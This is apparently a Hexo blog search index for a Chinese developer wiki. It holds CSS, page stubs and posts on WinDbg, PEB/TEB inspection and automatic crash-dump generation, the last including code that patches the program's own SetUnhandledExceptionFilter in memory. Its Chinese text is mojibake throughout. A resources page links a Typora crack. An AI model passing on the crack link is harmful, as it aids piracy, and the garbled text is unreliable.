{"pages":[{"title":"","date":"2024-08-31T01:41:20.269Z","path":"env.js","text":"export const obsidianExportPath = '/.obsidian/plugins/obsidian-iconize/';"},{"title":"","date":"2024-08-31T14:08:59.022Z","path":"CSS/callout_blocks.css","text":":root{--callout-note:68,138,255;--callout-abstract:0,176,255;--callout-info:0,184,212;--callout-tip:0,191,165;--callout-success:8,185,78;--callout-question:224,172,0;--callout-warning:255,145,0;--callout-failure:255,82,82;--callout-danger:255,23,68;--callout-bug:245,0,87;--callout-example:124,77,255;--callout-quote:158,158,158;--callout-radius:6px;--callout-border-opacity:0.5;--callout-title-bg-opacity:0.08}.callout-fold:before{align-self:center;content:url('data:image/svg+xml;charset=utf-8,')}.callout-fold{display:flex;transform:rotate(-90deg);transition:.5s cubic-bezier(.075,.82,.165,1)}.custom-callout[open]>summary>.callout-fold{transform:rotate(0deg)}.custom-callout>summary{border-top-left-radius:var(--callout-radius);border-top-right-radius:var(--callout-radius);cursor:pointer;margin:0;padding:0.5rem 1rem}.custom-callout>summary::marker{content:\"\"}.custom-callout>summary:before{margin-right:.5rem}.custom-callout>summary::-webkit-details-marker{display:none}.callout-title{--fsp: calc(17px - 1px);font-size: var(--fsp);display:flex;justify-content:space-between;font-weight:bold;}.custom-callout>.callout-body{background:transparent!important;border-left:none;margin:0!important;padding:.3rem 1rem;position:relative} .custom-callout>.callout-body>p{--fsp: calc(17px - 1px);font-size: var(--fsp);margin:8px 0}.custom-callout>.callout-body>pre{margin:1.25rem -1rem}.custom-callout>.callout-body>pre:first-child{margin-top:-.75rem}.custom-callout>.callout-body>pre:last-child{margin-bottom:-.75rem} .custom-callout.note,.custom-callout.seealso{border-color:rgba(var(--callout-note),var(--callout-border-opacity))}.custom-callout.note>summary,.custom-callout.seealso>summary{ background-color:rgba(var(--callout-note),var(--callout-title-bg-opacity)); color:rgba(var(var(--callout-note))) } .custom-callout.abstract,.custom-callout.summary,.custom-callout.tldr{border-color:rgba(var(--callout-abstract),var(--callout-border-opacity))}.custom-callout.abstract>summary,.custom-callout.summary>summary,.custom-callout.tldr>summary{ background-color:rgba(var(--callout-abstract),var(--callout-title-bg-opacity)); color:rgba(var(--callout-abstract))} .custom-callout.info,.custom-callout.todo{border-color:rgba(var(--callout-info),var(--callout-border-opacity))}.custom-callout.info>summary,.custom-callout.todo>summary{ background-color:rgba(var(--callout-info),var(--callout-title-bg-opacity)); color:rgba(var(--callout-info))} .custom-callout.hint,.custom-callout.important,.custom-callout.tip{border-color:rgba(var(--callout-tip),var(--callout-border-opacity))}.custom-callout.hint>summary,.custom-callout.important>summary,.custom-callout.tip>summary{ background-color:rgba(var(--callout-tip),var(--callout-title-bg-opacity)); color:rgba(var(--callout-tip))} .custom-callout.check,.custom-callout.done,.custom-callout.success{border-color:rgba(var(--callout-success),var(--callout-border-opacity))}.custom-callout.check>summary,.custom-callout.done>summary,.custom-callout.success>summary{ background-color:rgba(var(--callout-success),var(--callout-title-bg-opacity)); color:rgba(var(--callout-success))} .custom-callout.faq,.custom-callout.help,.custom-callout.question{border-color:rgba(var(--callout-question),var(--callout-border-opacity))}.custom-callout.faq>summary,.custom-callout.help>summary,.custom-callout.question>summary{ background-color:rgba(var(--callout-question),var(--callout-title-bg-opacity)); color:rgba(var(--callout-question))} .custom-callout.attention,.custom-callout.caution,.custom-callout.warning{border-color:rgba(var(--callout-warning),var(--callout-border-opacity))}.custom-callout.attention>summary,.custom-callout.caution>summary,.custom-callout.warning>summary{ background-color:rgba(var(--callout-warning),var(--callout-title-bg-opacity)); color:rgba(var(--callout-warning))} .custom-callout.fail,.custom-callout.failure,.custom-callout.missing{border-color:rgba(var(--callout-failure),var(--callout-border-opacity))}.custom-callout.fail>summary,.custom-callout.failure>summary,.custom-callout.missing>summary{ background-color:rgba(var(--callout-failure),var(--callout-title-bg-opacity)); color:rgba(var(--callout-failure))} .custom-callout.danger,.custom-callout.error{border-color:rgba(var(--callout-danger),var(--callout-border-opacity))}.custom-callout.danger>summary,.custom-callout.error>summary{ background-color:rgba(var(--callout-danger),var(--callout-title-bg-opacity)); color:rgba(var(--callout-danger))} .custom-callout.bug{border-color:rgba(var(--callout-bug),var(--callout-border-opacity))}.custom-callout.bug>summary{ background-color:rgba(var(--callout-bug),var(--callout-title-bg-opacity)); color:rgba(var(--callout-bug))} .custom-callout.example{border-color:rgba(var(--callout-example),var(--callout-border-opacity))}.custom-callout.example>summary{ background-color:rgba(var(--callout-example),var(--callout-title-bg-opacity)); color:rgba(var(--callout-example))} .custom-callout.cite,.custom-callout.quote{border-color:rgba(var(--callout-quote),var(--callout-border-opacity))}.custom-callout.cite>summary,.custom-callout.quote>summary{ background-color:rgba(var(--callout-quote),var(--callout-title-bg-opacity)); color:rgba(var(--callout-quote))} .callout-title>.callout-icon+div{-webkit-box-flex:1;-ms-flex:1 1 0%;-webkit-flex:1 1 0%;flex:1 1 0%;margin-left:.25rem}.callout-icon{align-items:center;color:#000;display:flex}.callout-icon:before{height:20px;width:20px}.custom-callout.attention>.callout-title>.callout-icon:before,.custom-callout.caution>.callout-title>.callout-icon:before,.custom-callout.warning>.callout-title>.callout-icon:before{content:url('data:image/svg+xml;charset=utf-8,')}.custom-callout.note>.callout-title>.callout-icon:before,.custom-callout.seealso>.callout-title>.callout-icon:before{content:url('data:image/svg+xml;charset=utf-8,')}.custom-callout.abstract>.callout-title>.callout-icon:before,.custom-callout.summary>.callout-title>.callout-icon:before,.custom-callout.tldr>.callout-title>.callout-icon:before{content:url('data:image/svg+xml;charset=utf-8,')}.custom-callout.info>.callout-title>.callout-icon:before,.custom-callout.todo>.callout-title>.callout-icon:before{content:url('data:image/svg+xml;charset=utf-8,')}.custom-callout.hint>.callout-title>.callout-icon:before,.custom-callout.important>.callout-title>.callout-icon:before,.custom-callout.tip>.callout-title>.callout-icon:before{content:url('data:image/svg+xml;charset=utf-8,')}.custom-callout.check>.callout-title>.callout-icon:before,.custom-callout.done>.callout-title>.callout-icon:before,.custom-callout.success>.callout-title>.callout-icon:before{content:url('data:image/svg+xml;charset=utf-8,')}.custom-callout.faq>.callout-title>.callout-icon:before,.custom-callout.help>.callout-title>.callout-icon:before,.custom-callout.question>.callout-title>.callout-icon:before{content:url('data:image/svg+xml;charset=utf-8,')}.custom-callout.fail>.callout-title>.callout-icon:before,.custom-callout.failure>.callout-title>.callout-icon:before,.custom-callout.missing>.callout-title>.callout-icon:before{content:url('data:image/svg+xml;charset=utf-8,')}.custom-callout.danger>.callout-title>.callout-icon:before,.custom-callout.error>.callout-title>.callout-icon:before{content:url('data:image/svg+xml;charset=utf-8,')}.custom-callout.bug>.callout-title>.callout-icon:before{content:url('data:image/svg+xml;charset=utf-8,')}.custom-callout.example>.callout-title>.callout-icon:before{content:url('data:image/svg+xml;charset=utf-8,')}.custom-callout.cite>.callout-title>.callout-icon:before,.custom-callout.quote>.callout-title>.callout-icon:before{content:url('data:image/svg+xml;charset=utf-8,')} .custom-callout.note > .callout-body { /* ç§»é™¤äº† background:transparent!important; æ”¹ä¸ºæ ¹æ®ç±»å‹å˜åŒ–çš„èƒŒæ™¯è‰² */ background-color: rgba(var(--callout-note), var(--callout-title-bg-opacity)); } /* æ ¹æ®ä¸åŒçš„ç±»å‹è®¾ç½®èƒŒæ™¯è‰²å’Œæ–‡å­—/å›¾æ ‡é¢œè‰² */ .custom-callout.note, .custom-callout.note > summary { background-color: rgba(var(--callout-note), var(--callout-title-bg-opacity)); } .custom-callout.abstract > .callout-body { background-color: rgba(var(--callout-abstract), var(--callout-title-bg-opacity)); } .custom-callout.abstract, .custom-callout.abstract > summary { background-color: rgba(var(--callout-abstract), var(--callout-title-bg-opacity)); } .custom-callout.info > .callout-body { background-color: rgba(var(--callout-info), var(--callout-title-bg-opacity)); } .custom-callout.info, .custom-callout.info > summary { background-color: rgba(var(--callout-info), var(--callout-title-bg-opacity)); } .custom-callout.tip > .callout-body { background-color: rgba(var(--callout-tip), var(--callout-title-bg-opacity)); } .custom-callout.tip, .custom-callout.tip > summary { background-color: rgba(var(--callout-tip), var(--callout-title-bg-opacity)); } .custom-callout.success > .callout-body { background-color: rgba(var(--callout-success), var(--callout-title-bg-opacity)); } .custom-callout.success, .custom-callout.success > summary { background-color: rgba(var(--callout-success), var(--callout-title-bg-opacity)); } .custom-callout.question > .callout-body { background-color: rgba(var(--callout-question), var(--callout-title-bg-opacity)); } .custom-callout.question, .custom-callout.question > summary { background-color: rgba(var(--callout-question), var(--callout-title-bg-opacity)); } .custom-callout.warning > .callout-body { background-color: rgba(var(--callout-warning), var(--callout-title-bg-opacity)); } .custom-callout.warning, .custom-callout.warning > summary { background-color: rgba(var(--callout-warning), var(--callout-title-bg-opacity)); } .custom-callout.failure > .callout-body { background-color: rgba(var(--callout-failure), var(--callout-title-bg-opacity)); } .custom-callout.failure, .custom-callout.failure > summary { background-color: rgba(var(--callout-failure), var(--callout-title-bg-opacity)); } .custom-callout.danger > .callout-body { background-color: rgba(var(--callout-danger), var(--callout-title-bg-opacity)); } .custom-callout.danger, .custom-callout.danger > summary { background-color: rgba(var(--callout-danger), var(--callout-title-bg-opacity)); } .custom-callout.bug > .callout-body { background-color: rgba(var(--callout-bug), var(--callout-title-bg-opacity)); } .custom-callout.bug, .custom-callout.bug > summary { background-color: rgba(var(--callout-bug), var(--callout-title-bg-opacity)); } .custom-callout.example > .callout-body { background-color: rgba(var(--callout-example), var(--callout-title-bg-opacity)); } .custom-callout.example, .custom-callout.example > summary { background-color: rgba(var(--callout-example), var(--callout-title-bg-opacity)); } .custom-callout.quote > .callout-body { background-color: rgba(var(--callout-quote), var(--callout-title-bg-opacity)); } .custom-callout.quote, .custom-callout.quote > summary { background-color: rgba(var(--callout-quote), var(--callout-title-bg-opacity)); } .custom-callout.cite > .callout-body { background-color: rgba(var(--callout-quote), var(--callout-title-bg-opacity)); } .custom-callout.cite, .custom-callout.cite > summary { background-color: rgba(var(--callout-quote), var(--callout-title-bg-opacity)); } .custom-callout.todo > .callout-body { background-color: rgba(var(--callout-info), var(--callout-title-bg-opacity)); } .custom-callout.todo, .custom-callout.todo > summary { background-color: rgba(var(--callout-info), var(--callout-title-bg-opacity)); } .custom-callout.seealso > .callout-body { background-color: rgba(var(--callout-note), var(--callout-title-bg-opacity)); } .custom-callout.seealso, .custom-callout.seealso > summary { background-color: rgba(var(--callout-note), var(--callout-title-bg-opacity)); } .custom-callout.hint > .callout-body { background-color: rgba(var(--callout-tip), var(--callout-title-bg-opacity)); } .custom-callout.hint, .custom-callout.hint > summary { background-color: rgba(var(--callout-tip), var(--callout-title-bg-opacity)); } .custom-callout.important > .callout-body { background-color: rgba(var(--callout-tip), var(--callout-title-bg-opacity)); } .custom-callout.important, .custom-callout.important > summary { background-color: rgba(var(--callout-tip), var(--callout-title-bg-opacity)); } .custom-callout.attention > .callout-body { background-color: rgba(var(--callout-warning), var(--callout-title-bg-opacity)); } .custom-callout.attention, .custom-callout.attention > summary { background-color: rgba(var(--callout-warning), var(--callout-title-bg-opacity)); } .custom-callout.caution > .callout-body { background-color: rgba(var(--callout-warning), var(--callout-title-bg-opacity)); } .custom-callout.caution, .custom-callout.caution > summary { background-color: rgba(var(--callout-warning), var(--callout-title-bg-opacity)); } .custom-callout.done > .callout-body { background-color: rgba(var(--callout-success), var(--callout-title-bg-opacity)); } .custom-callout.done, .custom-callout.done > summary { background-color: rgba(var(--callout-success), var(--callout-title-bg-opacity)); } .custom-callout.check > .callout-body { background-color: rgba(var(--callout-success), var(--callout-title-bg-opacity)); } .custom-callout.check, .custom-callout.check > summary { background-color: rgba(var(--callout-success), var(--callout-title-bg-opacity)); } .custom-callout.faq > .callout-body { background-color: rgba(var(--callout-question), var(--callout-title-bg-opacity)); } .custom-callout.faq, .custom-callout.faq > summary { background-color: rgba(var(--callout-question), var(--callout-title-bg-opacity)); } .custom-callout.help > .callout-body { background-color: rgba(var(--callout-question), var(--callout-title-bg-opacity)); } .custom-callout.help, .custom-callout.help > summary { background-color: rgba(var(--callout-question), var(--callout-title-bg-opacity)); } .custom-callout.fail > .callout-body { background-color: rgba(var(--callout-failure), var(--callout-title-bg-opacity)); } .custom-callout.fail, .custom-callout.fail > summary { background-color: rgba(var(--callout-failure), var(--callout-title-bg-opacity)); } .custom-callout.missing > .callout-body { background-color: rgba(var(--callout-failure), var(--callout-title-bg-opacity)); } .custom-callout.missing, .custom-callout.missing > summary { background-color: rgba(var(--callout-failure), var(--callout-title-bg-opacity)); } .custom-callout.error > .callout-body { background-color: rgba(var(--callout-danger), var(--callout-title-bg-opacity)); } .custom-callout.error, .custom-callout.error > summary { background-color: rgba(var(--callout-danger), var(--callout-title-bg-opacity)); } .custom-callout.tldr > .callout-body { background-color: rgba(var(--callout-abstract), var(--callout-title-bg-opacity)); } .custom-callout.tldr, .custom-callout.tldr > summary { background-color: rgba(var(--callout-abstract), var(--callout-title-bg-opacity)); }"},{"title":"Montarius","date":"2024-08-31T16:43:25.842Z","path":"about/index.html","text":"æ–‡å­—ä¸ä¸€å®šå‡†ç¡®ï¼Œä½†ä½ çœ‹åˆ°çš„å’Œå¬åˆ°çš„ä¸€å®šæ˜¯ä½ çš„ è‰å°ç­å­ æ»¡åœ°éƒ½æ˜¯å…­ä¾¿å£« æœ‹å‹ï¼ä½ å¥½ï¼åŠ æ²¹ï¼"},{"title":"","date":"2024-08-14T10:35:08.745Z","path":"Excalidraw/Drawing 2024-08-12 11.33.50.excalidraw.html","text":"âš  Switch to EXCALIDRAW VIEW in the MORE OPTIONS menu of this document. âš  You can decompress Drawing data with the command palette: â€˜Decompress current Excalidraw fileâ€™. For more info check in plugin settings under â€˜Savingâ€™ Drawing 1N4IgLgngDgpiBcIYA8DGBDANgSwCYCd0B3EAGhADcZ8BnbAewDsEAmcm+gV31TkQAswYKDXgB6MQHNsYfpwBGAOlT0AtmIBeNCtlQbs6RmPry6uA4wC0KDDgLFLUTJ2lH8MTDHQ0YNMWHRJMRZFAGZFAAYyJE9VGEYwGgQAbQBdcnQoKABlALA+UEl8PGzsDT5GTkxMch0YIgAhdFQAayKuRlwAYXpMenwEEABiADMx8ZAAX0mgA %%"},{"title":"","date":"2024-08-26T09:39:42.081Z","path":"Cover/index.html","text":"ğŸ¤ğŸ‘‰ğŸ‘‡ç‚¹å‡»å›¾ç‰‡å³å¯ä¸‹è½½ PPT å°é¢é€šç”¨.pptx é€šç”¨èƒŒæ™¯ å°é¢ Qt windows ç½‘ç»œç¼–ç¨‹ æ•°æ®ç»“æ„ä¸ç®—æ³• C++ å…¶ä»–"},{"title":"Categories","date":"2024-08-26T09:06:13.206Z","path":"categories/index.html","text":""},{"title":"ä¸€ç‰‡","date":"2024-08-26T03:45:41.223Z","path":"more/index.html","text":"ä¸ªäººç»´æŠ¤çš„wikiï¼Œæ¶‰åŠå·¥ä½œã€å­¦ä¹ ä¸­ç”¨åˆ°çš„æŠ€æœ¯å’Œæ–¹æ¡ˆä»¥åŠå·¥å…· &#123;% timeline %&#125;` &#123;% link https://holdyounger.github.io/POCC/ Awesome-POC desc:true %&#125; &#123;% link https://holdyounger.github.io/ScopeBlog/ ScopeBlog desc:true %&#125; [æ–‡ç« åˆ—è¡¨](Demo/Go/README.md) [Xmindæ–‡ä»¶](../../xmind/) [éŸ³ä¹](../../music/) [å°é¢](../../Cover/) [èµ„æº](../../resour/) [UML](../../UML/) [æˆ‘çš„ç®€å†](https://holdyounger.github.io/resume/?template=template1&user=holdyounger) `&#123;% iframe https://holdyounger.github.io/resume/?template=template1&user=holdyounger 150% 500 %&#125;` `&#123;% endtimeline %&#125;"},{"title":"","date":"2024-08-26T09:06:40.926Z","path":"notes/index.html","text":""},{"title":"Tags","date":"2024-08-14T01:41:30.090Z","path":"tags/index.html","text":""},{"title":"","date":"2023-09-21T10:05:16.363Z","path":"xmind/index.html","text":"[TOC] æ·±å…¥ç†è§£windowsæ“ä½œç³»ç»Ÿ.xmind Qtç±»å›¾.png Qt åŠ¨ç”»æ¡†æ¶ç»“æ„.xind"},{"title":"","date":"2024-09-01T12:11:30.794Z","path":".github/workflows/static.json","text":"{\"name\":\"Deploy static content to Pages\",\"on\":{\"push\":{\"branches\":[\"fluid\"]},\"workflow_dispatch\":null},\"permissions\":{\"contents\":\"read\",\"pages\":\"write\",\"id-token\":\"write\"},\"concurrency\":{\"group\":\"pages\",\"cancel-in-progress\":false},\"jobs\":{\"deploy\":{\"environment\":{\"name\":\"github-pages\",\"url\":\"${{ steps.deployment.outputs.page_url }}\"},\"runs-on\":\"ubuntu-latest\",\"steps\":[{\"name\":\"Checkout\",\"uses\":\"actions/checkout@v4\"},{\"name\":\"Setup Pages\",\"uses\":\"actions/configure-pages@v5\"},{\"name\":\"Upload artifact\",\"uses\":\"actions/upload-pages-artifact@v3\",\"with\":{\"path\":\".\"}},{\"name\":\"Deploy to GitHub Pages\",\"id\":\"deployment\",\"uses\":\"actions/deploy-pages@v4\"}]}}}"},{"title":"Code","date":"2024-04-18T03:01:06.264Z","path":"more/Demo/index.html","text":"All_Language_Code_Source ä¸åŒºåˆ†ç¼–ç¨‹è¯­è¨€ï¼Œåˆ†äº«çš„ä»£ç æ®µå‡å¯ä»¥push åšå®¢ holdyounger.github.io è¯­è¨€ Go Python Qt Visual Studio"},{"title":"Music","date":"2024-08-26T09:30:15.929Z","path":"more/music/index.html","text":""},{"title":"UML","date":"2024-08-14T01:08:19.531Z","path":"more/UML/index.html","text":"UML ç»˜å›¾ [toc] UML ç¤ºä¾‹ æ•£æ–‡ä»¶å‡çº§.puml"},{"title":"ReSource","date":"2023-10-09T08:29:30.106Z","path":"more/resour/index.html","text":"[TOC] ğŸ³Typora ğŸ”§Typoraç ´è§£ ğŸ”§Typoraä¸»é¢˜ ğŸViewdll.exe ğŸ’»å†…å­˜æ³„æ¼æ£€æµ‹å·¥å…·VLD [ğŸ§µCheat Engine](â€¦/â€¦/resour/Cheat Engine/CheatEngine75.exe) ğŸ”®ç½‘é€Ÿæ§åˆ¶å·¥å…· [ğŸ”®Beyond Compareç»¿è‰²ç‰ˆ](â€¦/â€¦/resour/Beyond Compare v4.1.4.20978 x64.exe) ğŸ”®PEview ğŸ”®OCAM å½•å±è½¯ä»¶ exeinfo.zip"}],"posts":[{"title":"ã€WinDbgã€‘è„šæœ¬","date":"2024-08-31T01:41:20.267Z","path":"wiki/è°ƒè¯•æŠ€æœ¯/ã€è°ƒè¯•æŠ€æœ¯ã€‘è„šæœ¬ä½¿ç”¨æ‰‹å†Œ/","text":"æ¦‚è¿°ï¼šWindbg è°ƒè¯•è„šæœ¬ä½¿ç”¨è®°å½• æŸ¥çœ‹ LDR_DATA_TABLE_ENTRY 1!list -t ntdll!_LIST_ENTRY.Flink -x &quot;dt ntdll!_LDR_DATA_TABLE_ENTRY @$extret\\&quot; 00007ffa9f99c4c0","tags":[{"name":"æ‰‹å†Œ","slug":"æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C/"},{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"windbg","slug":"windbg","permalink":"https://hodlyounger.github.io/tags/windbg/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"è°ƒè¯•æŠ€æœ¯","slug":"wiki/è°ƒè¯•æŠ€æœ¯","permalink":"https://hodlyounger.github.io/categories/wiki/%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"}]},{"title":"ã€è°ƒè¯•æŠ€æœ¯ã€‘ç¨‹åºè‡ªåŠ¨ç”Ÿæˆdumpæ–‡ä»¶","date":"2024-08-31T01:41:20.265Z","path":"wiki/è°ƒè¯•æŠ€æœ¯/ã€è°ƒè¯•æŠ€æœ¯ã€‘ç¨‹åºè‡ªåŠ¨ç”Ÿæˆdumpæ–‡ä»¶/","text":"æ¦‚è¿°ï¼šWindows ä¸‹è°ƒç”¨ dbghelp è‡ªåŠ¨ç”Ÿæˆç¨‹åº Dump [toc] ä¸€ã€Windows ç”Ÿæˆ dump æœ¬æ–‡ä¸»è¦è¯´æ˜windowsæ“ä½œç³»ç»Ÿä¸‹ï¼Œç¨‹åºå¦‚ä½•è‡ªåŠ¨ç”Ÿæˆdumpæ–‡ä»¶ å¦‚æœç”Ÿæˆdump ç”Ÿæˆdumpä¸»è¦ä¾èµ–äºwindowsapiå‡½æ•° SetUnhandledExceptionFilter,å‚æ•°ä¸ºä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œä¸»è¦ä¾èµ–äºè¯¥å‡½æ•°ä»¥åŠå›è°ƒå‡½æ•°ä¸­çš„ç›¸å…³é€»è¾‘ç”Ÿæˆdumpã€‚ 12LPTOP_LEVEL_EXCEPTION_FILTER WINAPI SetUnhandledExceptionFilter( _In_ LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilterï¼‰ æ³¨æ„ç‚¹ï¼š æœ€å¥½æ˜¯åœ¨ç¨‹åºå¼€å§‹å¤„è®¾ç½®å›è°ƒ å¦‚æœå›è°ƒä¸ç”Ÿæ•ˆï¼Œä¹Ÿå¯ä½¿ç”¨ AddVectoredExceptionHandler å‡½æ•°è®¾ç½®å›è°ƒï¼Œå…¶ç”¨æ³•ä¸ SetUnhandledExceptionFilter åŸºæœ¬ä¸€è‡´ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨ AddVectoredExceptionHandler åï¼Œoutpuydebugstring ä¹Ÿä¼šè§¦å‘å›è°ƒï¼Œæ‰€ä»¥è¿™ä¸ªå‡½æ•°æ…ç”¨ã€‚ dumpå›è°ƒå‡½æ•° dumpå›è°ƒå‡½æ•°å¯æ ¹æ®è‡ªå·±çš„éœ€æ±‚å»ç¼–å†™ï¼Œä»¥ä¸‹ä¸ºä¸€ä¸ªç¤ºä¾‹ï¼š 1234567891011121314151617181920212223242526272829303132LONG WINAPI MyUnhandledExceptionFilter( struct _EXCEPTION_POINTERS *ExceptionInfo )&#123; SYSTEMTIME st; GetLocalTime(&amp;st); CString time_now = _T(&quot;&quot;); time_now.Format(_T(&quot;%04d_%02d_%02d_%02d_%02d_%03d.dmp&quot;), st.wYear, st.wMonth, st.wDay,st.wHour, st.wMinute, st.wSecond, st.wMilliseconds); CString dump_file_path = GetRootPath(); //è·å–ç¨‹åºæ‰€åœ¨çš„æ–‡ä»¶å¤¹çš„è·¯å¾„ dump_file_path += _T(&quot;dump/&quot;); CreateDirectory(dump_file_path, NULL); dump_file_path += time_now; HANDLE hFile = CreateFile(dump_file_path, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if( hFile == INVALID_HANDLE_VALUE ) return EXCEPTION_CONTINUE_EXECUTION; // å¾€ä¸‹ä¼ ï¼Œç»§ç»­äº¤ç»™ windows é»˜è®¤çš„å¤„ç†å‡½æ•°å¤„ç† MINIDUMP_EXCEPTION_INFORMATION mdei; mdei.ThreadId = GetCurrentThreadId(); mdei.ExceptionPointers = ExceptionInfo; mdei.ClientPointers = NULL; MINIDUMP_CALLBACK_INFORMATION mci; mci.CallbackRoutine = NULL; mci.CallbackParam = 0; MiniDumpWriteDump(GetCurrentProcess(), GetCurrentProcessId(), hFile, MiniDumpNormal, &amp;mdei, NULL, &amp;mci); CloseHandle(hFile); return EXCEPTION_EXECUTE_HANDLER;&#125; è®¾ç½®å›è°ƒ å†™å®Œå›è°ƒå‡½æ•°ä¹‹åï¼Œè°ƒç”¨ SetUnhandledExceptionFilter ï¼Œå…¥å‚ä¸ºå›è°ƒå‡½æ•°ã€‚ 1SetUnhandledExceptionFilter(MyUnhandledExceptionFilter); åˆ°æ­¤ï¼Œè®¾ç½®å¹¶æ•è·å¼‚å¸¸çš„æ¥å£å®Œæˆï¼Œä»¥ä¸‹è¡¥å……å‡ ç‚¹ä¸ªäººç»éªŒã€‚ äºŒã€æ‰‹å†™å´©æºƒ 12345void CreteCrash()&#123; int *ptr = nullptr; *ptr = n;&#125; ä¸‰ã€å›è°ƒä¸ç”Ÿæ•ˆé—®é¢˜ SetUnhandledExceptionFilter æ˜¯æ— æ³•æ•è· printf, scan, strlen ç­‰CRTå‡½æ•°çš„å¼‚å¸¸çš„ï¼Œå¦‚printf(NULL) å¼‚å¸¸;é™¤æ­¤ä¹‹å¤–ï¼Œåœ¨æœ‰çš„ç¯å¢ƒå½“ä¸­ï¼Œå› ä¸ºè½¯ä»¶è¢«hookçš„é—®é¢˜ï¼Œå¯¼è‡´ å‡½æ•°ä¸ç”Ÿæ•ˆï¼Œè®¾ç½®çš„å›è°ƒå¾€å¾€ä¸èµ·ä½œç”¨ï¼Œæ­¤æ—¶å¯ä»¥ä¿®æ”¹è®¾ç½® çš„å‡½æ•°åœ°å€æ¥å±è”½å…¶ä»–è½¯ä»¶çš„hookã€‚ ä»£ç  123456789101112131415161718192021void DisableSetUnhandledExceptionFilter()&#123; void* addr = (void*)GetProcAddress(LoadLibrary(_T(&quot;kernel32.dll&quot;)), &quot;SetUnhandledExceptionFilter&quot;); if (addr != NULL) &#123; unsigned char code[16]; int size = 0; code[size++] = 0x33; code[size++] = 0xC0; code[size++] = 0xC2; code[size++] = 0x04; code[size++] = 0x00; DWORD dwOldFlag, dwTempFlag; VirtualProtect(addr, size, PAGE_READWRITE, &amp;dwOldFlag); WriteProcessMemory(GetCurrentProcess(), addr, code, size, NULL); VirtualProtect(addr, size, dwOldFlag, &amp;dwTempFlag); &#125;&#125; ä½¿ç”¨è¯´æ˜ åœ¨ç¨‹åºå¯åŠ¨å¹¶è®¾ç½®dumpå›è°ƒä¹‹åè°ƒç”¨ DisableSetUnhandledExceptionFilterå³å¯ã€‚ æ³¨æ„äº‹é¡¹ ç»æœ¬äººæµ‹è¯•ï¼Œåœ¨éƒ¨åˆ†æœºå™¨ä¸Šï¼Œä½¿ç”¨ WriteProcessMemoryå’Œ VirtualProtect å¯èƒ½ä¼šå¯¼è‡´ç¨‹åºå´©æºƒï¼Œå¹¶ä¸”ä¸ä¼šç”Ÿæˆdumpã€‚å¯å°è¯•ä¿®æ”¹ VirtualProtect å’Œ WriteProcessMemory å‡½æ•°çš„å‚æ•°æµ‹è¯•ã€‚ æ–¹æ¡ˆä¸€ ä¿®æ”¹ VirtualProtect çš„ flag.è®¾ç½®ä¸º PAGE_EXECUTE_READWRITE 1VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, &amp;dwOldFlag); æ–¹æ¡ˆäºŒ WriteProcessMemory å¯ç›´æ¥ä½¿ç”¨ memcpy æ›¿ä»£ã€‚ 1memcpy(addr, code, size); ä»£ç æ€»ç»“ 123456789101112131415DWORD dwOldFlag = 0;VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, &amp;dwOldFlag);#if 0HANDLE hProcess = GetCurrentProcess();if (!(hProcess == NULL || hProcess == INVALID_HANDLE_VALUE))&#123; WriteProcessMemory(GetCurrentProcess(), addr, code, size, NULL);&#125;else&#123; memcpy(addr, code, size);&#125;#endifmemcpy(addr, code, size);VirtualProtect(addr, size, dwOldFlag, &amp;dwOldFlag);","tags":[{"name":"windows/windbg","slug":"windows-windbg","permalink":"https://hodlyounger.github.io/tags/windows-windbg/"},{"name":"dump","slug":"dump","permalink":"https://hodlyounger.github.io/tags/dump/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"è°ƒè¯•æŠ€æœ¯","slug":"wiki/è°ƒè¯•æŠ€æœ¯","permalink":"https://hodlyounger.github.io/categories/wiki/%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"}]},{"title":"ã€è°ƒè¯•æŠ€æœ¯ã€‘ç”¨æˆ·æ€æŸ¥çœ‹PEBå’ŒTEB","date":"2024-08-31T01:41:20.263Z","path":"wiki/è°ƒè¯•æŠ€æœ¯/ã€è°ƒè¯•æŠ€æœ¯ã€‘ç”¨æˆ·æ€æŸ¥çœ‹PEBå’ŒTEB/","text":"æ¦‚è¿°ï¼šç”¨æˆ·æ€æŸ¥çœ‹è¿›ç¨‹ PEB å’Œ TEB(é€šè¿‡windbgé™„åŠ æˆ–å¯åŠ¨è°ƒè¯•çš„exe) 0x01 ç”¨æˆ·æ€æŸ¥çœ‹ TEB å’Œ PEB åœ¨åŒæœºè°ƒè¯•çš„æ—¶å€™ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ !PEB PID å’Œ !TEB TID è·å–è¿›ç¨‹å’Œçº¿ç¨‹çš„ç›¸å…³ä¿¡æ¯ï¼Œåœ¨ç”¨æˆ·æ€è¿™ä¸¤ä¸ªå‘½ä»¤å°±ä¼šå¤±æ•ˆã€‚åŸå› å°±æ˜¯ç”¨æˆ·æ€ä¸æ”¯æŒå¤§å†™çš„ !TEB å’Œ !PEB å‘½ä»¤ã€‚ åœ¨ç”¨æˆ·æ€è°ƒè¯•æ—¶è·å– teb å’Œ peb çš„å‘½ä»¤æ˜¯å°å†™çš„ã€‚ 12345#è·å– peb!peb# è·å– teb!teb é™¤æ­¤ä¹‹å¤–ï¼Œè¿™é‡Œæä¾›å¦å¤–ä¸€ç§æ€è·¯ã€‚æˆ‘ä»¬éƒ½çŸ¥é“ TEB ç»“æ„ä½“ä¸­ä¿å­˜äº†PEBçš„åœ°å€ï¼Œå› æ­¤å¯ä»¥é€šè¿‡TEBè·å–PEBçš„ç›¸å…³ä¿¡æ¯ã€‚ è¿™é‡Œä»¥ notepad.exe ä¸ºä¾‹æ¼”ç¤ºã€‚ 0x02 æ¼”ç¤º å‡†å¤‡æ­¥éª¤ è¿è¡Œ notepad.exeï¼Œ Win+R è¾“å…¥ 